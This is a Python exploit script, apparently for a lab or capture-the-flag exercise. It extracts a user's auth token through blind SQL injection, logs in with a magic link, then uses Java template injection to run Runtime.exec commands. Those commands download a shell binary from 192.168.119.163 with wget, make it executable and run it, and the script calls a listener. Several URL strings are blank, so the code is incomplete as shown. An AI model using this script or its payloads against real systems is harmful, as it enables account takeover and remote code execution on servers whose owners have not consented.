import requests
import sys
import time
import string
import subprocess
import threading


target = sys.argv[1]
print("Blind SQLi")
print("========")
time.sleep(1)

username = {}
proxies = {}
headers = {"Content-Type":"application/x-www-form-urlencoded"}
alpha_numeric = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
initialize_api = requests.get("s" % target)
getapiKey = requests.get("" % target).text

apiKey="apiKey=" + getapiKey
token = []


def listener():
	t = threading.Timer(1, SQLi)
	t.start()
	subprocess.call("", shell=True)


def apiReq(sqli):

	for j in alpha_numeric:
		magic_sqli = "" % (target, sqli.replace("[CHAR]", str(j)))
		r = requests.post(magic_sqli, data=apiKey, headers=headers)
		res = r.text
		if '"message":"User activated."' in res:
			return j
	return None


def SQLi():

	extracted = ""

	for i in range(1,100):
		injection_string = "0 OR (SELECT TRUE UNION SELECT CASE WHEN (substr(token,%s,1)=$$[CHAR]$$) THEN TRUE END from tokens where user_id = 1)" % i

		retrieved_value = apiReq(injection_string)
		if (retrieved_value):
			extracted += str(retrieved_value)
			extracted_str = str(retrieved_value)
			sys.stdout.write(extracted_str)
			sys.stdout.flush()
			token.append(extracted_str)
		else:
			print("\n" + "Done!")
			print("Flags below.")
			break

	#ADJUST IP ADDRESS
	email1 = {"content":"[[${T(java.lang.Runtime).getRuntime().exec('wget http://192.168.119.163:80/... -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell')}]]"}
	email2 = {"content":"[[${T(java.lang.Runtime).getRuntime().exec('chmod +x /tmp/shell')}]]"}
	email3 = {"content":"[[${T(java.lang.Runtime).getRuntime().exec('/tmp/shell')}]]"}

	userData = {
	"name":"SSTI",
	"email":"SSTI@SSTI"
	}

	getMagicLink = "" % (target, "".join(token))

	editEmail = "" % target

	addUser = "" % target
	with requests.Session() as s:

		auth = s.get(getMagicLink, allow_redirects=True)


		s.post(editEmail, data=email1, headers=headers, cookies=s.cookies)

		s.post(addUser, data=userData, headers=headers, cookies=s.cookies)

		s.post(editEmail, data=email2, headers=headers, cookies=s.cookies)

		s.post(addUser, data=userData, headers=headers, cookies=s.cookies)

		s.post(editEmail, data=email3, headers=headers, cookies=s.cookies)

		s.post(addUser, data=userData, headers=headers, cookies=s.cookies)


listener()
